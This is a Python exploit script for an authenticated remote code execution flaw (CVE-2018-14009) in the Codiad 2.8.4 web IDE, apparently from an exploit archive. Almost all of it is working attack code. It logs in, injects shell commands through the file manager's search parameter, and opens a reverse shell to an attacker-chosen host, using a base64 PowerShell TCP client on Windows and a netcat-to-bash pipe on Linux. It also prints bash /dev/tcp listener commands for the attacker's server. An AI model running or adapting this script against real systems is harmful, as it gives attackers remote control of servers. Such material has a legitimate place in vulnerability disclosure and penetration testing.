# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated)
# Discovery by: WangYihang
# Vendor Homepage: http://codiad.com/
# Software Links : https://github.com/Codiad/Codiad/releases
# Tested Version: Version: 2.8.4
# CVE: CVE-2018-14009


#!/usr/bin/env python
# encoding: utf-8
import requests
import sys
import json
import base64
session = requests.Session()
def login(domain, username, password):
    global session
    url = domain + "/components/user/controller.php?action=authenticate"
    data = {
        "username": username,
        "password": password,
        "theme": "default",
        "language": "en"
    }
    response = session.post(url, data=data, verify=False)
    content = response.text
    print("[+] Login Content : %s" % (content))
    if 'status":"success"' in content:
        return True
def get_write_able_path(domain):
    global session
    url = domain + "/components/project/controller.php?action=get_current"
    response = session.get(url, verify=False)
    content = response.text
    print("[+] Path Content : %s" % (content))
    json_obj = json.loads(content)
    if json_obj['status'] == "success":
        return json_obj['data']['path']
    else:
        return False
def base64_encode_2_bytes(host, port):
    payload = '''
    $client = New-Object System.Net.Sockets.TCPClient("__HOST__",__PORT__);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..255|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }
    $client.Close();
    '''
    result = ""
    for i in payload.replace("__HOST__", host).replace("__PORT__", str(port)):
        result += i + "\x00"
    return base64.b64encode(result.encode()).decode().replace("\n", "")
def build_powershell_payload(host, port):
    preffix = "powershell -ep bypass -NoLogo -NonInteractive -NoProfile -enc "
    return preffix + base64_encode_2_bytes(host, port).replace("+", "%2b")
def exploit(domain, username, password, host, port, path, platform):
    global session
    url = domain + \
        "components/filemanager/controller.php?type=1&action=search&path=%s" % (
            path)
    if platform.lower().startswith("win"):
        # new version escapeshellarg
        # escapeshellarg on windows will quote the arg with ""
        # so we need to try twice
        payload = '||%s||' % (build_powershell_payload(host, port))
        payload = "search_string=Hacker&search_file_type=" + payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.text
        print(content)
        # old version escapeshellarg
        payload = '%%22||%s||' % (build_powershell_payload(host, port))
        payload = "search_string=Hacker&search_file_type=" + payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.text
        print(content)
    else:
        # payload = '''SniperOJ%22%0A%2Fbin%2Fbash+-c+'sh+-i+%3E%26%2Fdev%2Ftcp%2F''' + host + '''%2F''' + port + '''+0%3E%261'%0Agrep+%22SniperOJ'''
        payload = '"%%0Anc %s %d|/bin/bash %%23' % (host, port)
        payload = "search_string=Hacker&search_file_type=" + payload
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        response = session.post(url, data=payload, headers=headers, verify=False)
        content = response.text
        print(content)
def promote_yes(hint):
    print(hint)
    while True:
        ans = input("[Y/n] ").lower()
        if ans == 'n':
            return False
        elif ans == 'y':
            return True
        else:
            print("Incorrect input")
def main():
    if len(sys.argv) != 7:
        print("Usage : ")
        print("        python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]" % (sys.argv[0]))
        print("        python %s [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]" % (sys.argv[0]))
        print("Example : ")
        print("        python %s http://localhost/ admin admin 8.8.8.8 8888 linux" % (sys.argv[0]))
        print("        python %s http://localhost:8080/ admin admin 8.8.8.8 8888 windows" % (sys.argv[0]))
        print("Author : ")
        print("        WangYihang <wangyihanger@gmail.com>")
        exit(1)
    domain = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    host = sys.argv[4]
    port = int(sys.argv[5])
    platform = sys.argv[6]
    if platform.lower().startswith("win"):
        print("[+] Please execute the following command on your vps: ")
        print("nc -lnvp %d" % (port))
        if not promote_yes("[+] Please confirm that you have done the two command above [y/n]"):
            exit(1)
    else:
        print("[+] Please execute the following command on your vps: ")
        print("echo 'bash -c \"bash -i >/dev/tcp/%s/%d 0>&1 2>&1\"' | nc -lnvp %d" % (host, port + 1, port))
        print("nc -lnvp %d" % (port + 1))
        if not promote_yes("[+] Please confirm that you have done the two command above [y/n]"):
            exit(1)
    print("[+] Starting...")
    if not login(domain, username, password):
        print("[-] Login failed! Please check your username and password.")
        exit(2)
    print("[+] Login success!")
    print("[+] Getting writeable path...")
    path = get_write_able_path(domain)
    if path == False:
        print("[+] Get current path error!")
        exit(3)
    print("[+] Writeable Path : %s" % (path))
    print("[+] Sending payload...")
    exploit(domain, username, password, host, port, path, platform)
    print("[+] Exploit finished!")
    print("[+] Enjoy your reverse shell!")
if __name__ == "__main__":
    main()